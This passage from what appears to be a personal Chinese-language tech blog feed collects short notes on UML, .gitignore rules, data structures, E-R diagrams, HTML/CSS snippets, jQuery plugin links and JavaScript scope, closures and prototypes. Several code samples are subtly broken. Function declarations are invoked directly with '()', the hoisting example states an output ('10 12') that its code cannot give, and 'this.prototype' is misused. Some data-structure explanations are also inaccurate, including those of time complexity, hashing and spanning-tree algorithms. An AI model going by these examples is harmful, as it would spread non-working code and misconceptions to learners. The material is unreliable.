        <content type="html"><![CDATA[<p>采用UML设计<br>关于几种UML图的含义<br>1.用例图,解释用户操作的图例.<br>2.类图,类的继承和关联关系<br>3.顺序图,表达操作流程的图例,以时间为线索,此实例没有任何故障的操作;<br>4.状态图,系统的不同状态的转换;<br>5.协作图,重点表示了对象之间的某些关系.</p><p>关于一个项目完整的技术要求<br>1.css html javascript jquery 应用为:前端验证,jquery特效<br>2.mysql php Yii</p><p>做一个项目的流程:<br>1.写好的需求分析需求,如果有可能就做出原型也就是界面.也可以画出用例图,即用户需要实现的功能.<br>2.更具需求和原型设计出数据库和表.,然后”记录就是对象实例,表结构就是类.”的原则,设计类图，确定使用那些对对象，使用mvc模式会减少和很多工作。<br>3.根据业务流程,过一次业务逻辑,画出时序图.<br>4.编写代码,根据设计原型做出界面.<br>5.根据数据库结构,组织数据模型.<br>6.根据业务逻辑和时序图,编写控制器部分的代码(MVC模式).<br>7.整合代码,以及必要的测试.</p>]]></content>
      
      
      <categories>
          
          <category> 理论方法 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>css pre 导致自动换行</title>
      <link href="/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B/frontend/css-pre/"/>
      <url>/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B/frontend/css-pre/</url>
      
        <content type="html"><![CDATA[<pre><code>pre{  white-space:pre-wrap;/*css-3*/  white-space:-moz-pre-wrap;/*Mozilla,since1999*/  white-space:-pre-wrap;/*Opera4-6*/  white-space:-o-pre-wrap;/*Opera7*/  word-wrap:break-word;/*InternetExplorer5.5+*/　　}</code></pre>]]></content>
      
      
      <categories>
          
          <category> 前端工程 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>git 忽略一些文件</title>
      <link href="/git/git/git-ignore/"/>
      <url>/git/git/git-ignore/</url>
      
        <content type="html"><![CDATA[<p>一般我们总会有些文件无需纳入 Git 的管理，也不希望它们总出现在未跟踪文件列表。通常都是些自动生成的文件，比如日志文件，或者编译过程中创建的临时文件等。我们可以创建一个名为 .gitignore 的文件，列出要忽略的文件模式。来看一个实际的例子：</p><pre><code>$ cat .gitignore*.[oa]*~</code></pre><p>第一行告诉 Git 忽略所有以 .o 或 .a 结尾的文件。一般这类对象文件和存档文件都是编译过程中出现的，我们用不着跟踪它们的版本。第二行告诉 Git 忽略所有以波浪符（<code>~</code>）结尾的文件，许多文本编辑软件（比如 Emacs）都用这样的文件名保存副本。此外，你可能还需要忽略 log，tmp 或者 pid 目录，以及自动生成的文档等等。要养成一开始就设置好 .gitignore 文件的习惯，以免将来误提交这类无用的文件。</p><p>文件 .gitignore 的格式规范如下：</p><ul><li>所有空行或者以注释符号 ＃ 开头的行都会被 Git 忽略。</li><li>可以使用标准的 glob 模式匹配。</li><li>匹配模式最后跟反斜杠（<code>/</code>）说明要忽略的是目录。</li><li>要忽略指定模式以外的文件或目录，可以在模式前加上惊叹号（<code>!</code>）取反。</li></ul><p>所谓的 glob 模式是指 shell 所使用的简化了的正则表达式。星号（<code>*</code>）匹配零个或多个任意字符；<code>[abc]</code> 匹配任何一个列在方括号中的字符（这个例子要么匹配一个 a，要么匹配一个 b，要么匹配一个 c）；问号（<code>?</code>）只匹配一个任意字符；如果在方括号中使用短划线分隔两个字符，表示所有在这两个字符范围内的都可以匹配（比如 <code>[0-9]</code> 表示匹配所有 0 到 9 的数字）。</p><p>我们再看一个 .gitignore 文件的例子：</p><pre><code># 此为注释 – 将被 Git 忽略*.a       # 忽略所有 .a 结尾的文件!lib.a    # 但 lib.a 除外/TODO     # 仅仅忽略项目根目录下的 TODO 文件，不包括 subdir/TODObuild/    # 忽略 build/ 目录下的所有文件doc/*.txt # 会忽略 doc/notes.txt 但不包括 doc/server/arch.txt</code></pre>]]></content>
      
      
      <categories>
          
          <category> git </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>数据结构中的基本概念</title>
      <link href="/arithmetic/arithmetic/basic-data-structure/"/>
      <url>/arithmetic/arithmetic/basic-data-structure/</url>
      
        <content type="html"><![CDATA[<p>数据结构的很多概念真的是很莫名其妙，很多坑爹的定义，笔者开始很搞不明白，为什么学数据结构？为什么用哪个拗口词语？这些概念到底用在什么地方？笔者试图用自己简单的话来阐述这些问题，希望能对这些感觉不是很好理解的同学有帮助。</p><p>　　数据结构是算法的基石，算法是软件灵魂。</p><p>　　不废话，直接开始。</p><p>　　一、概论</p><p>　　  <strong>时间复杂度</strong>：就是算法实现的执行的时间，说白了就是程序套了好多循环。没有就是o(n),2层循环就是o(n2)，如此，剩下就不要管了。</p><p>　　　<strong>空间复杂度</strong>：说白了就是你定义了好多的变量，程序执行是额外使用了好多冗余内存。</p><p>　　　<strong>算法标准</strong>：什么算法是好的算法？好用就行。1、正确2、简单 3、占内存少 4、速度快 ，这几点不可兼得，自己把握，其实能简单和速度是主要的。</p><p>　　　二、线性表</p><p>　　　　顺序<em>存储结构    连续的存储</em></p><p>　　　　</p><p><img src="/arithmetic/arithmetic/basic-data-structure/2012101617494371.jpg" alt="img"></p><p> 　　　<em>链式存储结构　　　　　 内存中随机存储的，只需要指针写出下一个结点在哪里即可</em></p><p><img src="/arithmetic/arithmetic/basic-data-structure/2012101617503529.jpg" alt="img"></p><p>　　　　<strong>线性表</strong>：逻辑上不分叉就行。一个个数据元素前后相连（就是前驱、后继）。数据项平等对待。与此相对就是数、图。用途：其实就是数组啦。</p><p>　　　　<strong>链表：</strong>采用链式存储方式的线性表。什么是链式存储？就是一个数据项中不仅保存数据还要告诉下一个数据在哪里。用途：数据大小不确定时用。</p><p>　　　　从普通链表拓展的概念：</p><p>　　　　1、<strong>循环链表</strong>：首尾相连的链表；</p><p>　　　　2、<strong>双链表：</strong>前后相随的链表；前&lt;  &gt;后</p><p>　　　　　　用途：特殊情况加快链表的操作；</p><p>　　三、栈和队列</p><p>　　　　这个什么东西？就是功能被限制的链表，没有什么区别；</p><p>　　　　栈：只能从上面往下放，然后从上面去取；  就是一个坑啊，有木有！</p><p>　　　　　　　链栈：链式存储的栈；</p><p>　　　　　　　顺序栈：顺序存储的栈；</p><p>　　　　队列：前面装入数据，后面取出数据； 用途：保障时间的顺序，比如用户事务操作；</p><p>　　　　　　　链队列：链式存储的队列；  链队列：长度没限制啊，是不是、</p><p>　　　　　　　　　顺序队列：顺序存储的队列； </p><p>　　四、串</p><p>　　　　　　就是把字符放到前面的线性表中。不然怎么叫字符串呢？ 所以很多语言字符串就是一个对象；</p><p>　　五、多维素组</p><p>　　　　　　素组的元素可以又是一个数组。 这个就是一个树。</p><p>　　六、树</p><p>　　　　　　有分叉的链表但是不能首尾相连；（线索二叉树除外，线索二叉树就是图了都）；</p><p>　　　　　　二叉树：最多两个分支。</p><p>　　　　　　深林：几个树放到一起（没连接哈），就是个深林；形象啊、</p><p>　　　　　　遍历：记住以根为标准即可，先访问根：先序；访问了左边，再访问根：中序；最后访问根：后序；</p><p>　　　　　　最优二叉树（哈夫曼树）：就是把权重的往上放。  用途：用来编码，用的多的，权重的自然放在前面了，权力大的就在上面（和金字塔的社会不是很像么？）；</p><p>　　　　　　线索二叉树：叶子节点的指针域不要浪费，指向其他，按照遍历的顺序来。其实就是一个图了。</p><p>　　　</p><p>　　七、图</p><p>　　　　　　无限个指针域，随你指向那个结点，不要重复就行。</p><p>　　　　　　无向图：指向a 被指向a,算作一样；</p><p>　　　　　　有向图：指向a被指向a,不同的，不一样；</p><p>　　　　　　带权:指向这个行为还有程度值，权值。</p><p>　　　　　　网络：带权的有向图。 路由协议中，由路由器组成的网络就是向且带权，比如速度、延迟不一样，上传、下载速度不一样；</p><p>　　　　　　遍历的问题有点麻烦</p><p>　　　　　　　　深度优先：就是一直往下走，不回头。</p><p>　　　　　　　　广度优先：一层一层剥下去。</p><p>　　　　　　生成树：把图滤成一个树。删除循环的连接；primus算法类似深度优先的思想，克鲁斯卡尔算法类似广度优先的思想；</p><p>　　　　　　最短路径：一个一个列出来，比较最小的；</p><p>　　八、排序和查找</p><p>　　　　　　<strong>先看排序：</strong></p><p>　　　　　　1、冒泡排序：就像气泡一样，当前元素和下一个比，合适就这样，不合适就交换折腾 n * n次</p><p>　　　　　　2、快速：元素找到自己的排序位置，当每个人都找到了，那个顺序就定了。</p><p>　　　　　　3、选择：老实的排序法，找到最值，放在哪里，又去找最值。。。。</p><p>　　　　　　4、堆：和选择一样建一个具有堆的性质二叉树（节点永远比子节点大），堆顶就是最值，拿出来，再建一次堆。。。</p><p>　　　　　　7、插入：随便拿一个向有序的中放。问：开始没有有序的序列啊？答：开始只有找一个元素参照，一个必然是有序的，然后可以结合二分法查找，来排序，用查找的思想排序，逆天了有木有啊、</p><p>　　　　　　8、归并：几组有序的合并成一个。很简单，每人轮流拿出一个比较下，放进篮子里不就完了。</p><p>　　　　　　<strong>排序好了才能查找，否则就只能一个一个查找了</strong></p><p>　　　　　　1、顺序查找：就是一个一个来；</p><p>　　　　　　2、二分法：简单，找中间，每次排除一半；</p><p>　　　　　　3、分块：建个索引，就是分割区域，这些区域对应到一个序列，例如123，然后去找，索引越细致，速度越快，但是修改了，会重建索引，把握程度即可。</p><p>　　　　　　4、二叉排序树：把数据存在一个树里，这个树的数据以中序遍历的顺序来存，这个结点的左边比右边小，就很好找了、每次排除整体的一半。</p><p>　　　　　　5、B-树：用二叉排序树当做索引存普通数据，因为二叉排序树的建立、删除代价太大了。</p><p>　　　　　　<strong>什么是散列？</strong></p><p>　　　　　　举个栗子。。。。数据位1-100，怎么存?你可以用1-5（自己定哈），1-20划到1中，21-40划到2中。那么就是1-100的散列为1-5，</p><p>查找就很方便了，先看在那个区域里，再去找。可以说这是二分法的推广，二分法其实就是看做1-2的散列。</p><p>　　　　　　最后说几个问题：</p><p>　　　　　　1、排序用在数据库中的表记录上面，数据库必须要排序，就是在建立索引时发生的。大量的数据才会体现，排序算法的价值，可以用来节约钱啊。。。。。</p><p>　　　　　　2、数据库一般把索引文件和数据文件分开的。特别典型的就是MYSQL的MYISAM存储引擎。</p><p>　　　　　　3、所谓的存储引擎就是不通过的算法实现，采用不同的适合不同场合的算法，这些场合要求不同，比如有的要求速度，有的要求并发量大，可串行化。数据库采用具不同的存储引擎，对程序有很大的影响，且一定要合适。</p>]]></content>
      
      
      <categories>
          
          <category> arithmetic </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>E-R 图</title>
      <link href="/%E6%8A%80%E6%9C%AF%E6%9E%B6%E6%9E%84/architecture/diagram-er/"/>
      <url>/%E6%8A%80%E6%9C%AF%E6%9E%B6%E6%9E%84/architecture/diagram-er/</url>
      
        <content type="html"><![CDATA[<p>实体-联系图(Entity-Relation Diagram)用来建立数据模型,在数据库系统概论中属于概念设计阶段，形成一个独立于机器，独立于DBMS的ER图模型。 通常将它简称为ER图，相应地可把用ER图描绘的数据模型称为ER模型。ER图提供了表示实体（即数据对象）、属性和联系的方法，用来描述现实世界的概念模型。</p><p>　　矩形框：表示实体，在框中记入实体名。</p><p><img src="/技术架构/architecture/diagram-er/2012101019534328.jpg" alt="img"></p><p>　　菱形框：表示联系，在框中记入联系名。</p><p>　　椭圆形框：表示实体或联系的属性，将属性名记入框中。对于主属性名，则在其名称下划一下划线。</p><p>　　连线：实体与属性之间；实体与联系之间；联系与属性之间用直线相连，并在直线上标注联系的类型。（对于一对一联系，要在两个实体连线方向各写1； 对于一对多联系，要在一的一方写1，多的一方写N；对于多对多关系，则要在两个实体连线方向各写N,M。)</p>]]></content>
      
      
      <categories>
          
          <category> 技术架构 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>html 常用代码块</title>
      <link href="/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B/frontend/html-sections-collections/"/>
      <url>/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B/frontend/html-sections-collections/</url>
      
        <content type="html"><![CDATA[<pre><code>html申明对ie6-8在html中添加no-css3这个class和各个版本的class，对ie7以下添加lte7这个class，然后根据我们目前使用浏览器的比例，把第一的ie6放在判断第一位。&lt;!DOCTYPE HTML&gt;&lt;!--[if IE 6]&gt;&lt;html class=&quot;ie6 lte9 lte7 no-css3&quot; lang=&quot;zh-cn&quot;&gt;&lt;![endif]--&gt;&lt;!--[if IE 8]&gt;&lt;html class=&quot;ie8 lte9 no-css3&quot; lang=&quot;zh-cn&quot;&gt;&lt;![endif]--&gt;&lt;!--[if IE 9]&gt;&lt;html class=&quot;ie9 lte9 no-css3&quot; lang=&quot;zh-cn&quot;&gt;&lt;![endif]--&gt;&lt;!--[if IE 7]&gt;&lt;html class=&quot;ie7 lte9 lte7 no-css3&quot; lang=&quot;zh-cn&quot;&gt;&lt;![endif]--&gt;&lt;!--[if !(IE 6) | !(IE 7) | !(IE 8) | !(IE 9)  ]&gt;&lt;!--&gt;&lt;html lang=&quot;zh-cn&quot;&gt;&lt;!--&lt;![endif]--&gt;&lt;head&gt;&lt;meta charset=&quot;UTF-8&quot;&gt;&lt;title&gt;无标题文档&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><pre><code>判断浏览器，添加所需文件//为ie6-8添加一个ie.css文件&lt;!--[if lte IE 8]&gt;&lt;link href=&quot;css/ie.css&quot; type=&quot;text/css&quot; rel=&quot;stylesheet&quot; media=&quot;all&quot;&gt;&lt;![endif]--&gt;//为ie6添加处理png的js文件&lt;!--[if IE 6]&gt;      &lt;script type=&quot;text/javascript&quot; src=&quot;js/DD_belatedPNG_0.0.8a-min.js?_v=&lt;%=JS_VERSION%&gt;&quot;&gt;&lt;/script&gt;      &lt;script type=&quot;text/javascript&quot;&gt;          //给所有需要处理的png图片加上dd-pngifx这个class，就可以处理了          DD_belatedPNG.fix(&quot;.dd-pngfix&quot;);      &lt;/script&gt;&lt;![endif]--&gt;</code></pre><pre><code>常规布局这个布局的特点是border，margin，padding由里面的inner部分来完成，所以左中右三个加起来就是总的宽度，而不用考虑左中右的margin，border，padding之类的，当然之所有选择这个布局，还有其他的一些变化，详细请参看布局。这里列出左右边栏布局的代码以供参考。&lt;div class=&quot;page asides-two&quot;&gt;    &lt;div class=&quot;wrap-header&quot;&gt;        &lt;div id=&quot;header&quot;&gt;            &lt;div class=&quot;inner clearfix&quot;&gt;&lt;/div&gt;        &lt;/div&gt;    &lt;/div&gt;&lt;!--wrap-header--&gt;    &lt;div class=&quot;wrap-container&quot;&gt;        &lt;div id=&quot;container&quot; class=&quot;clearfix&quot;&gt;            &lt;div id=&quot;aside_left&quot; class=&quot;aside&quot;&gt;                &lt;div class=&quot;inner&quot;&gt;&lt;/div&gt;            &lt;/div&gt;&lt;!--aside_left--&gt;            &lt;div id=&quot;main&quot;&gt;                &lt;div class=&quot;inner clearfix&quot;&gt;&lt;/div&gt;            &lt;/div&gt;&lt;!--main--&gt;            &lt;div id=&quot;aside_right&quot; class=&quot;aside&quot;&gt;                &lt;div class=&quot;inner&quot;&gt;&lt;/div&gt;            &lt;/div&gt;&lt;!--aside_right--&gt;        &lt;/div&gt;    &lt;/div&gt;&lt;!--wrap-container--&gt;    &lt;div class=&quot;wrap-footer&quot;&gt;        &lt;div id=&quot;footer&quot;&gt;            &lt;div class=&quot;inner clearfix&quot;&gt;&lt;/div&gt;        &lt;/div&gt;    &lt;/div&gt;&lt;!--wrap-footer--&gt;&lt;/div&gt;</code></pre><pre><code>边栏区块边栏一般加有aside-block这个class，然后每个区块有一个属于自己的id，以方便协作查阅及日后修改。内容由block-content这个class包括起来，如果标题右侧有更多等信息，使用head-title结构。当然如果边栏区块足够简单如就一张图片，那就根本就不需要这个结构了。&lt;div id=&quot;&quot; class=&quot;aside-block&quot;&gt;  &lt;h2&gt;&lt;/h2&gt;  &lt;div class=&quot;block-content&quot;&gt;&lt;/div&gt;&lt;/div&gt;&lt;!-- 标题右侧有更多等文字信息 --&gt;&lt;div id=&quot;&quot; class=&quot;aside-block&quot;&gt;  &lt;div class=&quot;head-title clearfix&quot;&gt;    &lt;h2&gt;&lt;/h2&gt;    &lt;a href=&quot;#&quot; class=&quot;more&quot;&gt;&lt;/a&gt;  &lt;/div&gt;  &lt;div class=&quot;block-content&quot;&gt;&lt;/div&gt;&lt;/div&gt;</code></pre><pre><code>关于H1在首页的时候，网站的h1标题为站点名字，当网站在内页的时候，内页标题为h1。所以对站点名字输出进行判断，以jsp为例：&lt;% if(isFront) { %&gt;  &lt;h1 class=&quot;ele-invisible&quot;&gt;天涯游戏&lt;/h1&gt;&lt;% }else { %&gt;  &lt;strong class=&quot;ele-invisible&quot;&gt;天涯游戏&lt;/strong&gt;&lt;% } %&gt;当然大多数时候其实我们一般是显示logo，而网站名称我们也许是需要隐藏的，那样我们添加了个ele-invisible的class，这个class的样式为：/*ele-invisible  */.ele-invisible{    position: absolute;    clip:rect(1px 1px 1px 1px);/* ie6,7*/    clip: rect(1px, 1px, 1px, 1px);}</code></pre>]]></content>
      
      
      <categories>
          
          <category> 前端工程 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>jQuery 插件收集</title>
      <link href="/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B/frontend/jquery-plugin-collections/"/>
      <url>/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B/frontend/jquery-plugin-collections/</url>
      
        <content type="html"><![CDATA[<p>1、轮播图插件</p><p>比较好的有</p><p><a href="http://web.ue360.net/ui/" target="_blank" rel="noopener">http://web.ue360.net/ui/</a></p><p>比较复杂，但是绝对首选</p><p>2、手机上用的图片墙插件</p><p><a href="http://www.photoswipe.com/" target="_blank" rel="noopener">http://www.photoswipe.com/</a></p><p>3、多文件上传插件 很好用，比较复杂</p><p><a href="http://blueimp.github.io/jQuery-File-Upload/" target="_blank" rel="noopener">http://blueimp.github.io/jQuery-File-Upload/</a></p><p>还有一个比较简单是单文件的</p><p>叫做jquery uploddify</p><p>4、jquery form提交插件</p><p>用于使用ajax提交数据</p><p><a href="http://malsup.com/jquery/form/‎" target="_blank" rel="noopener">http://malsup.com/jquery/form/%E2%80%8E</a></p><p>5、jquery form validate </p><p>　　用于表单验证</p><p>6、SimpleModal</p><p>　　很简单的弹出层插件</p><p>7、touch slider </p><p>　　兼容触摸的slider插件</p><p><a href="http://www.qiqiboy.com/2012/11/30/touchslider-1-2-publish.html" target="_blank" rel="noopener">http://www.qiqiboy.com/2012/11/30/touchslider-1-2-publish.html</a></p><p>8、评分插件 </p><p>jRating</p><p><a href="http://demos.myjqueryplugins.com/jrating/" target="_blank" rel="noopener">demo http://demos.myjqueryplugins.com/jrating/</a></p><p> 9、图片热点插件</p><p><a href="http://www.sitejs.cn/download/201304/yulan/jquery pic tip/" target="_blank" rel="noopener">http://www.sitejs.cn/download/201304/yulan/jquery%20pic%20tip/</a></p><p>养车网做过一次</p><p>10、手风琴效果</p><p>　<a href="http://www.cnblogs.com/lhb25/archive/2013/03/13/20-jquery-accordion-plugins-for-websites.html" target="_blank" rel="noopener">http://www.cnblogs.com/lhb25/archive/2013/03/13/20-jquery-accordion-plugins-for-websites.html</a></p><p>11、png 压缩工具，牛逼的算法</p><p><a href="http://tinypng.org/" target="_blank" rel="noopener">　　http://tinypng.org/</a></p><p>12、js图表插件，使用者很多的一个</p><p><a href="http://www.highcharts.com/demo/dynamic-master-detail" target="_blank" rel="noopener">http://www.highcharts.com/demo/dynamic-master-detail</a></p><p>13、拖拽的插件</p><p><a href="http://draggabilly.desandro.com/" target="_blank" rel="noopener">http://draggabilly.desandro.com/</a></p><p>14、音乐播放器，解决音乐贺卡问题</p><p><a href="http://osvaldas.info/audio-player-responsive-and-touch-friendly" target="_blank" rel="noopener">http://osvaldas.info/audio-player-responsive-and-touch-friendly</a></p><p>15、旋转的播放插件</p><p><a href="http://baijs.nl/tinycircleslider/" target="_blank" rel="noopener">http://baijs.nl/tinycircleslider/</a></p><p>16、页面元素翻转</p><p><a href="http://labs.mintchaos.com/flippant.js/" target="_blank" rel="noopener">http://labs.mintchaos.com/flippant.js/</a></p><p>17、网页音频js</p><p><a href="https://github.com/goldfire/howler.js" target="_blank" rel="noopener">https://github.com/goldfire/howler.js</a></p><p>18、移动版本的slider 效果</p><p><a href="http://www.xiaobai8.com/demo/2012/20120928/index.html" target="_blank" rel="noopener">http://www.xiaobai8.com/demo/2012/20120928/index.html</a></p><p>19、一大批手机jquery mobile插件</p><p><a href="http://www.cnblogs.com/wangyunbing/archive/2012/11/16/2772731.html" target="_blank" rel="noopener">http://www.cnblogs.com/wangyunbing/archive/2012/11/16/2772731.html</a></p><p> 20、非常有名的一个支持触摸轮播插件</p><p><a href="http://swipejs.com/" target="_blank" rel="noopener">http://swipejs.com/</a></p><p> 21、jquery mobile 的日期时间选择插件</p><p><a href="http://dev.jtsage.com/jQM-DateBox/" target="_blank" rel="noopener">http://dev.jtsage.com/jQM-DateBox/</a></p><p>21、一个很小的触摸库</p><p><a href="http://www.netcu.de/jquery-touchwipe-iphone-ipad-library" target="_blank" rel="noopener">http://www.netcu.de/jquery-touchwipe-iphone-ipad-library</a></p><p>22、jquery.anchor.1.0 页面中使用锚点自由掉转的插件</p><p><a href="http://www.zhangxinxu.com/wordpress/2010/07/锚点跳转及jquery下相关操作与插件/" target="_blank" rel="noopener">http://www.zhangxinxu.com/wordpress/2010/07/%E9%94%9A%E7%82%B9%E8%B7%B3%E8%BD%AC%E5%8F%8Ajquery%E4%B8%8B%E7%9B%B8%E5%85%B3%E6%93%8D%E4%BD%9C%E4%B8%8E%E6%8F%92%E4%BB%B6/</a></p><p>23、可以是图片左右翻滚的插件</p><p><a href="http://www.kaiwo123.com/down/js-532/" target="_blank" rel="noopener">http://www.kaiwo123.com/down/js-532/#</a></p><p>24、一批在触摸设备上使用的jquery插件列表</p><p><a href="http://www.w3cplus.com/source/jquery-plugins-that-handle-touch-events-43-items.html" target="_blank" rel="noopener">http://www.w3cplus.com/source/jquery-plugins-that-handle-touch-events-43-items.html</a></p><p>　　</p><p>　　24.1 支持panel 和 图片拖拽轮播的一个插件 <a href="http://www.idangero.us/sliders/swiper/" target="_blank" rel="noopener">http://www.idangero.us/sliders/swiper/</a> 很久想要这个效果了、</p><p>25、一个用户引导插件（bootstrap 风格）</p><p><a href="http://usablica.github.io/intro.js/" target="_blank" rel="noopener">http://usablica.github.io/intro.js/</a></p><p>26、头部固定的一个jquery 插件</p><p><a href="http://www.fixedheadertable.com/2010/06/01/version-1-1-2-available-for-download/" target="_blank" rel="noopener">http://www.fixedheadertable.com/2010/06/01/version-1-1-2-available-for-download/#</a></p><p>27,动画插件</p><p><a href="http://ricostacruz.com/jquery.transit/#top" target="_blank" rel="noopener">http://ricostacruz.com/jquery.transit/#top</a></p><p>28  IE6 png 修复插件 <a href="https://code.google.com/p/customize-your-blogger/downloads/detail?name=DD_belatedPNG_0.0.8a-min.js&amp;can=2&amp;q=" target="_blank" rel="noopener">https://code.google.com/p/customize-your-blogger/downloads/detail?name=DD_belatedPNG_0.0.8a-min.js&amp;can=2&amp;q=</a></p><p>29  非常好用的右键菜单</p><p><a href="http://www.zhangxinxu.com/wordpress/2011/05/jquery-smartmenu右键自定义上下文菜单插件/" target="_blank" rel="noopener">http://www.zhangxinxu.com/wordpress/2011/05/jquery-smartmenu%E5%8F%B3%E9%94%AE%E8%87%AA%E5%AE%9A%E4%B9%89%E4%B8%8A%E4%B8%8B%E6%96%87%E8%8F%9C%E5%8D%95%E6%8F%92%E4%BB%B6/</a></p><p> 30 alert confirm 重写插件 </p><p>　　<a href="http://www.oschina.net/p/apprise" target="_blank" rel="noopener">http://www.oschina.net/p/apprise</a></p><p>31 tree插件 可以实现多级分类</p><p>　　<a href="http://jquery.bassistance.de/treeview/demo/?1" target="_blank" rel="noopener">http://jquery.bassistance.de/treeview/demo/?1</a></p><p>32 <a href="http://stickerjs.cmiscm.com/" target="_blank" rel="noopener">http://stickerjs.cmiscm.com/</a> 粘贴纸条效果</p><p>33 全页滚动插件</p><p><a href="http://www.jq22.com/jquery-info573" target="_blank" rel="noopener">http://www.jq22.com/jquery-info573</a></p><p>34 多级菜单</p><p>jquery.dlmenu.js</p><p>35 页面切换插件</p><p><a href="http://www.yyyweb.com/demo/page-transitions/" target="_blank" rel="noopener">http://www.yyyweb.com/demo/page-transitions/</a></p><p>pagetransitions.js</p>]]></content>
      
      
      <categories>
          
          <category> 前端工程 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>理解js 的作用域链 原型链 闭包 词法分析</title>
      <link href="/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B/frontend/understand-js-advance/"/>
      <url>/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B/frontend/understand-js-advance/</url>
      
        <content type="html"><![CDATA[<p>1、作用域链　　</p><pre><code>    &lt;script type=&quot;text/javascript&quot;&gt;        //作用域链        b = &#39;没有使用var 声明，因此是一个全局变量。&#39;;        var a = &quot;使用了var声明，声明在最顶级的部分，属于window对象下的，一个变量，我们所有的程序都在window下运行，因此也是一个全局变量&quot;;        function fa(){            fa_b  = &quot;虽然在fa下面，但是我没有进行使用var 声明，所以我还是一个全局变量;&quot;;            var fa_a = &quot;我使用了var 声明，变量的作用域在方法 fa下面&quot;;            alert(&#39;这是 window下面的一个方法&#39;);                function fa_fa(){                alert(&#39;这是 fa_fa下面的一个方法,只能在fa方法下面调用。&#39;);　　　　　　　　　alert(b);//寻找变量b的步骤为  fa_fa &gt; fa &gt; Window &gt; 全局。                }        }        /*            总结:                1、js里面一切都是对象                    2、js里面一切对象都是引用                3、作用域链说白了就是从内到外寻找变量而已;            */    &lt;/script&gt;</code></pre><p> 预编译和词法分析</p><p>先来一个典型的例子</p><pre><code>&lt;script type=&quot;text/javascript&quot;&gt;    function fa(age){        // var age = 10;        var age;        function age(){            alert(age);        }        alert(age);        // var age;        age= 12;        alert(age);    }    fa(&#39;11&#39;);    //结果  10 12&lt;/script&gt;</code></pre><p>js,执行的内部顺序，</p><p>　　1、词法分析或者又称为预编译，就是先对代码进行检查，检查变量的声明，具体赋值操作，在具体运行的时候，</p><p>　　　　词法分析分为3个阶段和优先级，优先级低的最先被分析，然后出现优先级高的情况就会被，优先级高的覆盖。</p><p>　　　　1、分析参数里面的变量，如果方法中出现了形参，相当于把变量 var 定义了一次，</p><p>　　　　2、分析局部变量的定义</p><p>　　　　3、分析方法的定义，如果开始被定义了为变量，然后被定义了为方法，会按照方法解释。</p><p>　　总结：方法的优先级 》  var声明的变量 》 传过来的参数 ，在JS 中不仅一切都是对象，连方法都是属性，可以给方法赋值一个普通数据。</p><p>2、闭包</p><p>　　　所谓闭包，就是一个方法里面可以定义局部变量和局部方法，一旦这个方法被调用，方法内部就会形成一个活动域，方法内部的变量互相调用不受影响。</p><pre><code>    &lt;!-- 闭包 --&gt;    &lt;script type=&quot;text/javascript&quot;&gt;        function fa(){            function fa_fa(){                alert(b);            }();            var b = &quot;注意这是一个局部变量;&quot;;        }        /*            总结：                1、变量b外部是无法获取到的,方法fa 被调用时，fa_fa被声明，并立即执行（）为立即执行,                此时，fa中间的所有资源被激活，fa_fa 能访问到变量b,但是由于b 在fa 里面，fa构成了一个闭包;        */    &lt;/script&gt;</code></pre><p>3、原型链</p><pre><code class="javascript">    &lt;!-- //原型链 --&gt;    &lt;script type=&quot;text/javascript&quot;&gt;        var orgen = new Object({&quot;id&quot;:&#39;haha&#39;});        function Person(age,color){            var word = &#39;hello&#39;;            this.age = age;            this.color = color;            this.speak = function (){                _speak();            }();            function _speak(){                alert(age);            }            this.prototype = orgen;        }            var me = new Person(1,&#39;red&#39;);        me.money = 12;        me.prototype.getMoney = function(){            orgen.money = 12;            console.log(this);        }();        alert(me.prototype.money);        console.log(me);        console.log(me.prototype);            /*            说明：                1、一个对象由一个构造方法实例化而来,但是构造方法是一个Function对象。                2、一个构造方法需要继承，是根据一个对象来继承的，注意不是构造方法、                3、prototype 指向的是，原型对象，注意不是原型对象的方法                4、如果对象本身没有属性，系统会向对象的原型继续寻找，一直循着这个链条寻找，这就是原型链        */    &lt;/script&gt;</code></pre>]]></content>
      
      
      <categories>
          
          <category> 前端工程 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>jQuery 插件开发分析</title>
      <link href="/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B/frontend/jquery-plugin-develop/"/>
      <url>/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B/frontend/jquery-plugin-develop/</url>
      
        <content type="html"><![CDATA[<p>1、使用;开始</p><p>2、使用闭包(function($))($);</p><p>3、合并参数 $.extend();</p><p>4、return this 返回对象本身</p><p>5、this是选择器匹配到的对象</p><pre><code>;(function($){    $.fn.fun = function(options){        var options = $.extend({            //默认配置参数        },options);        return this;  //这里的this指的是jquer 对象    }    var a1; //局部变量    function f1(){ //局部方法    }})($);</code></pre><p>上面是一个例子</p><p>下面贴上一个例子</p><pre><code>;(function ($) {  var loadImg = function (url, fn) {    var img = new Image();    img.src = url;    if (img.complete) {      fn.call(img);    } else {      img.onload = function () {        fn.call(img);        img.onload = null;      };        };  };  $.fn.imgAutoSize = function (padding) {    var maxWidth = this.innerWidth() - (padding || 0);    return this.find(&#39;img&#39;).each(function (i, img) {      loadImg(this.src, function () {        if (this.width &gt; maxWidth) {          var height = maxWidth / this.width * this.height,            width = maxWidth;          img.width = width;          img.maxHeight = height;        };      });    });  };})(jQuery);    </code></pre>]]></content>
      
      
      <categories>
          
          <category> 前端工程 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>jQuery 评分插件</title>
      <link href="/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B/frontend/jquery-plugin-rate/"/>
